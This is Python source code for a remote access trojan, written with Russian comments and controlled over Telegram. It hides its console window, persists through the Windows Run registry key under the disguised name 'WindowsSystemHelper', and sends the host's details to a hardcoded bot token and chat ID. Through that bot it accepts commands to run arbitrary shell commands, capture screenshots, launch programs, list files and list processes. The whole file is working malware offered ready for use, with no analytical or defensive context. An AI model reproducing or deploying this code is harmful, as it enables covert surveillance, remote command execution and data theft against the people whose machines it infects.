import os
import sys
import subprocess
import tempfile
import ctypes
import winreg
import threading
import time
import socket
import platform
from datetime import datetime
from PIL import ImageGrab
import pyautogui
import psutil
import telebot
import getpass
import hashlib

# НАСТРОЙКИ - ЗАМЕНИТЕ СВОИМИ ДАННЫМИ
BOT_TOKEN = "7028058741:AAEFHQqAU0GqK3d5z1p_4WYpchGrJ7nQ7CY"
CHAT_ID = "1348535485"

class SystemRat:
    def __init__(self):
        self.token = BOT_TOKEN
        self.chat_id = CHAT_ID
        self.bot = telebot.TeleBot(self.token)
        self.agent_id = self.generate_id()
        self.running = True
        
        # Скрываем консоль
        self.hide_console()
        
        # Устанавливаем персистентность
        self.ensure_persistence()
        
        # Запускаем компоненты
        self.start_bot_thread()
        self.send_startup_message()
        
        # Главный цикл
        self.main_loop()
    
    def hide_console(self):
        """Скрытие окна консоли"""
        try:
            if platform.system() == "Windows":
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def generate_id(self):
        """Генерация ID агента"""
        system_info = platform.node() + getpass.getuser() + platform.processor()
        return hashlib.md5(system_info.encode()).hexdigest()[:8]
    
    def ensure_persistence(self):
        """Добавление в автозагрузку"""
        try:
            # Путь к текущему файлу
            current_path = sys.argv[0]
            
            # Реестр
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "WindowsSystemHelper", 0, winreg.REG_SZ, 
                                f'"{sys.executable}" "{current_path}"')
            print("[+] Добавлено в автозагрузку")
        except Exception as e:
            print(f"[-] Ошибка автозагрузки: {e}")
    
    def send_telegram(self, text, photo_path=None):
        """Отправка сообщения в Telegram"""
        try:
            if photo_path and os.path.exists(photo_path):
                with open(photo_path, 'rb') as photo:
                    self.bot.send_photo(self.chat_id, photo, caption=text)
            else:
                self.bot.send_message(self.chat_id, text)
            return True
        except Exception as e:
            return False
    
    def get_system_info(self):
        """Получение информации о системе"""
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
        except:
            hostname = "unknown"
            ip = "unknown"
        
        return {
            "ID": self.agent_id,
            "Пользователь": getpass.getuser(),
            "Компьютер": hostname,
            "ОС": f"{platform.system()} {platform.release()}",
            "IP": ip,
            "Время": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "Путь": sys.argv[0]
        }
    
    def send_startup_message(self):
        """Отправка сообщения о запуске"""
        info = self.get_system_info()
        message = "🟢 Агент активирован\n"
        for key, value in info.items():
            message += f"{key}: {value}\n"
        
        self.send_telegram(message)
    
    def take_screenshot(self):
        """Создание скриншота"""
        try:
            screenshot = ImageGrab.grab()
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.jpg')
            screenshot.save(temp_file.name, 'JPEG', quality=90)
            temp_file.close()
            
            self.send_telegram(f"📸 Скриншот {datetime.now().strftime('%H:%M:%S')}", temp_file.name)
            os.unlink(temp_file.name)
            return True
        except Exception as e:
            self.send_telegram(f"❌ Ошибка скриншота: {str(e)}")
            return False
    
    def execute_command(self, cmd):
        """Выполнение команды"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            
            if len(output) > 1500:
                output = output[:1500] + "\n...[обрезано]"
            
            return output
        except Exception as e:
            return f"Ошибка: {str(e)}"
    
    def open_program(self, path):
        """Запуск программы"""
        try:
            if os.path.exists(path):
                subprocess.Popen(path, shell=True)
                return f"✅ Запущено: {path}"
            else:
                # Пробуем через PATH
                subprocess.Popen(path, shell=True)
                return f"⚠️ Выполнено: {path}"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def list_files(self, path="."):
        """Список файлов"""
        try:
            if not os.path.exists(path):
                path = "."
            
            files = os.listdir(path)
            result = f"📁 {path}:\n"
            
            for i, file in enumerate(files[:10]):
                full_path = os.path.join(path, file)
                if os.path.isdir(full_path):
                    result += f"[DIR] {file}\n"
                else:
                    size = os.path.getsize(full_path)
                    result += f"[FILE] {file} ({size} байт)\n"
            
            if len(files) > 10:
                result += f"... и {len(files)-10} других\n"
            
            return result
        except Exception as e:
            return f"Ошибка: {str(e)}"
    
    def get_processes(self):
        """Получение списка процессов"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    p_info = proc.info
                    processes.append(f"{p_info['pid']} - {p_info['name']}")
                except:
                    continue
            
            return "PID - Процесс\n" + "\n".join(processes[:15])
        except Exception as e:
            return f"Ошибка: {str(e)}"
    
    def handle_command(self, message):
        """Обработка команд от бота"""
        text = message.text
        chat_id = str(message.chat.id)
        
        if chat_id != self.chat_id:
            return
        
        if text.startswith('/'):
            cmd = text.split()[0]
            
            if cmd == '/start' or cmd == '/help':
                help_text = """
Команды:
/info - Информация о системе
/screen - Скриншот
/cmd [команда] - Выполнить команду
/open [путь] - Открыть программу
/files [путь] - Список файлов
/proc - Список процессов
/exit - Завершить работу
"""
                self.bot.reply_to(message, help_text)
            
            elif cmd == '/info':
                info = self.get_system_info()
                info_text = "\n".join([f"{k}: {v}" for k, v in info.items()])
                self.bot.reply_to(message, info_text)
            
            elif cmd == '/screen':
                self.bot.reply_to(message, "Делаю скриншот...")
                self.take_screenshot()
            
            elif cmd.startswith('/cmd '):
                command = text[5:].strip()
                if command:
                    self.bot.reply_to(message, f"Выполняю: {command}")
                    output = self.execute_command(command)
                    self.bot.reply_to(message, f"Результат:\n{output}")
                else:
                    self.bot.reply_to(message, "Использование: /cmd [команда]")
            
            elif cmd.startswith('/open '):
                path = text[6:].strip()
                if path:
                    result = self.open_program(path)
                    self.bot.reply_to(message, result)
                else:
                    self.bot.reply_to(message, "Использование: /open [путь]")
            
            elif cmd.startswith('/files'):
                path = text[7:].strip() if len(text) > 7 else "."
                result = self.list_files(path)
                self.bot.reply_to(message, result)
            
            elif cmd == '/proc':
                processes = self.get_processes()
                self.bot.reply_to(message, processes)
            
            elif cmd == '/exit':
                self.bot.reply_to(message, "Завершаю работу...")
                self.running = False
                os._exit(0)
    
    def start_bot_thread(self):
        """Запуск бота в отдельном потоке"""
        def bot_polling():
            @self.bot.message_handler(func=lambda message: True)
            def handle_all_messages(message):
                self.handle_command(message)
            
            while self.running:
                try:
                    self.bot.polling(none_stop=True, timeout=30)
                except Exception as e:
                    time.sleep(5)
                    continue
        
        thread = threading.Thread(target=bot_polling, daemon=True)
        thread.start()
        print("[+] Бот запущен")
    
    def main_loop(self):
        """Главный цикл программы"""
        while self.running:
            time.sleep(1)

def main():
    print("System Helper Service starting...")
    rat = SystemRat()

if __name__ == "__main__":
    main()
